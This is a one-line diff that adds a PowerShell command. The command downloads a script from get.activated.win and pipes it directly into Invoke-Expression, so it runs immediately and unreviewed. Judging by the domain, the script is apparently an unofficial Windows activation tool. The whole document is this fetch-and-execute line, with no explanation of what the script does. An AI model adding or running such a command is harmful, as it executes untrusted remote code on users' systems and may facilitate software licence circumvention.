@@ -1,0 +1,1 @@
+iwr -usebasic 'https://get.activated.win' | iex
